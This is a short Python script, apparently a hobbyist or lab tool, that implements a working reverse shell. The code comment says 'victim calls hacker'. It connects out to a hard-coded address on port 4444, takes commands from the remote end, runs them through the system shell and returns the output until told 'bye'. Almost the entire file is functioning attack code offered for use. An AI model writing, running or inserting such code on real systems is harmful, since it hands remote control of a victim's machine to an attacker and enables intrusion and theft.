import subprocess, sys, socket
#reverse shell, victim calls hacker


def executeCmd(cmd):
    cmd = subprocess.check_output(cmd,shell=True)
    return cmd


def openRecv(ip,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((str(ip),port))
    #s.send(b"[+] Connection established\n")
    closeSignal = False
    while closeSignal == False:
        #s.send(b'#'*50)
        #s.send(b'\nStarting execution pipeline, enter \'bye\' to close connection\n')
        #s.send(b"Shell command$:")
        cmdIn = s.recv(1024)
        cmdIn = cmdIn.decode()
        if cmdIn.strip() != 'bye':
            try:
                cmdOut = executeCmd(cmdIn)
                s.send(str(cmdOut).encode('utf-8'))
            except subprocess.CalledProcessError:
                s.send(b'Subprocess Error, shell command not accepted by target')
        else:
            s.send(b'\Exit call received, closing connection\n')
            s.close()
            sys.exit()
try:
    recv = openRecv('10.211.55.5',4444)
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()










